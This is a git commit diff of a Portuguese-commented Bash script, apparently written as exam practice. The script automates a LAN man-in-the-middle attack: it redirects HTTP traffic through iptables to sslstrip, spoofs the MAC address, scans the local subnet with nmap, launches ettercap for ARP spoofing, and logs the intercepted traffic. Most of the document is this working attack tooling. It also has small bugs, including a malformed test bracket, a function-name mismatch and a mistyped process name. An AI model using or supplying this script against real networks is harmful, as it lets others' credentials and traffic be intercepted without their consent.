3f18fef6852f998bda3667880d72d42b3062dd69
Joao Lucas <joaolucas@linuxmail.org>
2016-05-04 20:39:38 -0300

    Scripts criado para se preparar pro exame CompTIA LX0-102

--- mitm_v2.sh
+++ mitm_v2.sh
@@ -2,18 +2,30 @@
 # Script de ARP-Spoof utilizando sslstrip e ettercap
 # 
 # Data: 2016/05/04
-# Autor: Joao Lucas
+# Autor: Joao Lucas 
+# Github: https://github.com/joao-lucas
 #
 
-menu {
+function menu() {
+
+# Variáveis de ambiente
+DATA=`date | cut -d ' ' -f 5`
+PREFIX='/home/joao_lucas/Área\ de\ trabalho/Capturas'
+ARQUIVO=capMiTMv2-$DATA.log
+ 
+ 
         clear
+        echo "###############Data: `date`###################"
+        echo "Diretório da captura: $PREFIX"
+        echo "Arquivo da captura: $ARQUIVO"
+        echo "####################################################################"
         echo "1. Listar placas de rede"
         echo "2. Ver regras do iptables"
         echo "3. Limpar regras do iptables"
         echo "4. Iniciar regras"
         echo "5. Mudar macaddress" 
         echo "6. Identificas hosts"
-        echo "7. Iniciar Snnifer"
+        echo "7. Iniciar snnifer"
         echo "99. Sair"
         read -p "> Escolha: " opt
 
@@ -25,35 +37,53 @@ menu {
                 5) mudarMacAddress ;;
                 6) identificarHosts ;;
                 7) iniciarSnnifer ;;
-                8) echo "Saindo..."; sleep 3; exit ;;
-                *) echo "Opção Invalida!" ; menu ;;
+                99) echo "Saindo..."; sleep 1; exit ;;
+                *) echo "Opção invalida!" ; sleep 2;  menu ;;
         esac
 }      
 
-listarPlacasdeRede {
+# opção 1
+function listarPlacasdeRede() {
         ifconfig -a | less 
         menu
 }
 
-verRegrasdoIptables {
-        iptables -t nat -L | less
+# opção 2
+function verRegrasdoIptables {
+        iptables -t nat -L
+        if [ $? -eq 0 ]
+        then
+                echo "[ OK ] Comando executado com sucesso."
+                sleep 2
+        else
+                echo "[ FALHA ] Ocorreu erros na listagem das regras!"
+                sleep 2
+        fi
         menu
         
 }
-limparRegrasdoIptables{
-        iptables -t nat -F | less
-        menu
-}
- 
-mudarMacAddress{
-        macchanger -r wlp2s0
-        sleep 3
+
+# opção 3
+function limparRegrasdoIptables() {
+        iptables -t nat -F
+        if [ $? -eq 0]
+        then
+                echo "[ OK ] Comando executado com sucesso."
+                sleep 2
+        else
+                echo "[ FALHA ] Não foi possivel limpar as regras!"
+                sleep 2
+        fi
+        sleep 2
         menu
 }
 
-iniciarRegras {
+# opção 4
+function iniciarRegras() {
         # criando regras no iptables
         echo "~> Criando regras no iptables..."
+        sleep 2
+        iptables -t nat -F
         iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000        
         if [ $? -eq 0 ]
         then
@@ -70,21 +100,43 @@ iniciarRegras {
                 fi                  
         else
                echo "[ FALHA ] Ocorreu erros em criar regras!"
+               sleep 2
        fi
         
        menu  
 }
+ 
+# opção 5
+function mudarMacAddress() {
+        macchanger -r wlp2s0
+        if [ $? -eq 0 ]
+        then
+                echo "[ OK ] Macaddress mudado com sucesso."
+                sleep 2
+        else
+                echo "[ FALHA ] Ocorreu erros na alteração do macaddress!"
+                sleep 2
+        fi
 
-identificarHosts{
-        nmap -Pn -T 3 192.168.1.0/24 | tee hosts.txt && egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hosts.txt | awk '{print $5}' | less
         menu
 }
 
-iniciarSniffer {
+function identificarHosts() {
+        nmap -Pn -T 3 192.168.1.0/24 | tee $PREFIX/mitm_hosts.txt && egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' $PREFIX/mitm_hosts.txt | awk '{print $5}'
+        sleep 2
+        menu
+}
+
+function iniciarSniffer() {
         # salvando em ...
         ettercap -G &
  
         killall -TERM sslstripe
-        xfce4-terminal -e sslstrip -w $PREFIX/cap$DATA.log
+        xfce4-terminal -e sslstrip -w $PREFIX/$ARQUIVO
         tail -f $PREFIX/$ARQUIVO | tee mitm_output.txt
 }
+
+while true
+do
+        menu
+done
